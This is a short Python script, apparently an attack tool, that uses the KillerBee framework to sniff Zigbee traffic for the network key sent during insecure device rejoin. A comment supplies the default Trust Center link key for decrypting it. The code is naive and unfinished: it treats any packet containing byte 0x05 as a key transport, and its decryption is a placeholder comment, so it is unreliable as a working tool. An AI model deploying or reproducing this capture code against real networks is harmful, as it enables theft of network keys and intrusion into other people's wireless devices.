#!/usr/bin/env python3
"""
Zigbee key sniffer - captures network key during insecure rejoin
Requires: Killerbee framework, compatible Zigbee sniffer
"""

from killerbee import KillerBee
from scapy.all import *

def sniff_zigbee_key(channel=11, interface="KB0"):
    kb = KillerBee(device=interface)
    kb.set_channel(channel)

    print(f"[*] Sniffing Zigbee channel {channel}...")
    print("[*] Waiting for device rejoin or commissioning...")

    while True:
        packet = kb.pnext()
        if packet is not None:
            # Parse for transport key command (0x05)
            # Network key is sent encrypted with default Zigbee TC link key
            # Default key: 5a:69:67:42:65:65:41:6c:6c:69:61:6e:63:65:30:39

            if b'\x05' in packet:  # Transport Key command
                print(f"[+] Potential key transport detected!")
                print(f"Packet: {packet.hex()}")

                # Decrypt using default TC link key
                # (Implementation depends on Zigbee stack)

# Usage: sniff_zigbee_key()
